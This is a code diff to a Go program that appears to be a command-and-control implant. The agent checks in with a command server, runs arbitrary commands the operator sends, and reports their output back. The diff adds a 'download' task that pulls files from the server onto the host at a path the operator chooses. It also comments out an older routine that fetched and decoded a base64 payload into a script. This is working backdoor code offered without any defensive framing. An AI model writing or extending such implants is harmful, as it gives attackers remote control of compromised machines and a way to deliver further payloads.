@@ -6,10 +6,11 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"time"
 
 	// "io/ioutil"
-	b64 "encoding/base64"
+
 	"log"
 	"net/http"
 	"os"
@@ -195,10 +196,60 @@ func checkIn() {
 		reboot(post.TaskID)
 	case "run command":
 		go handle_runCommand(post.TaskID, post.Arg)
+
+	case "download":
+		go handle_download(post.TaskID, post.Arg)
 	default:
 		// Well if it doesn't match 🤷‍♀️
 
 	}
+
+}
+
+func handle_download(this_taskID string, args string) {
+
+	var response Task_Response
+	// serverURL := command_server + "/download"
+	parts := strings.Split(args, " || ")
+	filename := parts[0]
+	path := parts[1]
+
+	fmt.Println("💀 Downloading")
+
+	fmt.Println("Filename " + filename)
+	fmt.Println("path " + path)
+
+	time.Sleep(2 * time.Second)
+
+	// Download the file
+	err := downloadFile(command_server, filename, path)
+	if err != nil {
+		fmt.Println("Error downloading file:", err)
+
+		response = Task_Response{this_taskID, "failed", ""}
+
+		send_response(response)
+		return
+	}
+
+	response = Task_Response{this_taskID, "Success", ""}
+	send_response(response)
+}
+
+// Runs a command based of a task. Then creates a response.
+func handle_runCommand(this_taskID string, command string) {
+
+	var response Task_Response
+
+	output, command_error_message := runCommand(command)
+	if command_error_message != "" {
+		response = Task_Response{this_taskID, "failed", output}
+	} else {
+		response = Task_Response{this_taskID, "complete", output}
+
+	}
+
+	send_response(response)
 
 }
 
@@ -285,75 +336,99 @@ func reboot(task_id string) error {
 
 }
 
-func getFIle() {
+// func getFIle() {
 
-	fmt.Println("\nStarting the getting file thing")
+// 	fmt.Println("\nStarting the getting file thing")
 
-	data := map[string]string{"ID": NodeID}
+// 	data := map[string]string{"ID": NodeID}
 
-	json_data, err := json.Marshal(data)
+// 	json_data, err := json.Marshal(data)
+// 	if err != nil {
+// 		log.Fatal(err)
+// 	}
+
+// 	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
+// 	if err != nil {
+// 		panic(err)
+// 	}
+
+// 	// Add the header to say that it's json
+// 	r.Header.Add("Content-Type", "application/json")
+
+// 	//Create a client to send the data and then send it
+// 	client := &http.Client{}
+// 	res, err := client.Do(r)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+
+// 	//shrug
+// 	defer res.Body.Close()
+
+// 	fmt.Println(res.StatusCode)
+
+// 	// Parse the JSON response
+// 	post := &command{}
+
+// 	fmt.Println(1)
+// 	derr := json.NewDecoder(res.Body).Decode(post)
+// 	if derr != nil {
+// 		panic(derr)
+// 	}
+
+// 	// Decoding the body so it's readable
+// 	details, _ := b64.StdEncoding.DecodeString(post.Details)
+// 	fmt.Println(string(details))
+
+// 	// Output the JSON response
+// 	fmt.Println("ID: ", post.ID)
+// 	fmt.Println("Command: ", post.Command)
+// 	fmt.Println("Details: ", string(details))
+
+// 	// Write the string to file
+// 	script_to_file(string(details))
+
+// }
+
+func downloadFile(serverURL string, filename string, filepath string) error {
+	// Create the file
+	out, err := os.Create(filepath)
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
+	defer out.Close()
 
-	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
+	// Make the request
+	resp, err := http.Get(serverURL + "/download/" + filename)
 	if err != nil {
-		panic(err)
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Check the status code
+	if resp.StatusCode != http.StatusOK {
+		os.Remove(filepath) // if the file isn't found. remove the empty destination
+		return fmt.Errorf("failed to download file: %s", resp.Status)
 	}
 
-	// Add the header to say that it's json
-	r.Header.Add("Content-Type", "application/json")
+	// Write the body to file in chunks
+	buf := make([]byte, 1024*1024) // 1MB buffer
+	for {
+		n, err := resp.Body.Read(buf)
+		if err != nil && err != io.EOF {
+			return err
+		}
+		if n == 0 {
+			break
+		}
 
-	//Create a client to send the data and then send it
-	client := &http.Client{}
-	res, err := client.Do(r)
-	if err != nil {
-		panic(err)
+		_, err = out.Write(buf[:n])
+		if err != nil {
+			return err
+		}
 	}
 
-	//shrug
-	defer res.Body.Close()
-
-	fmt.Println(res.StatusCode)
-
-	// Parse the JSON response
-	post := &command{}
-
-	fmt.Println(1)
-	derr := json.NewDecoder(res.Body).Decode(post)
-	if derr != nil {
-		panic(derr)
-	}
-
-	// Decoding the body so it's readable
-	details, _ := b64.StdEncoding.DecodeString(post.Details)
-	fmt.Println(string(details))
-
-	// Output the JSON response
-	fmt.Println("ID: ", post.ID)
-	fmt.Println("Command: ", post.Command)
-	fmt.Println("Details: ", string(details))
-
-	// Write the string to file
-	script_to_file(string(details))
-
-}
-
-// Runs a command based of a task. Then creates a response.
-func handle_runCommand(this_taskID string, command string) {
-
-	var response Task_Response
-
-	output, command_error_message := runCommand(command)
-	if command_error_message != "" {
-		response = Task_Response{this_taskID, "failed", output}
-	} else {
-		response = Task_Response{this_taskID, "complete", output}
-
-	}
-
-	send_response(response)
-
+	return nil
 }
 
 // Runs a command, and returns the output.
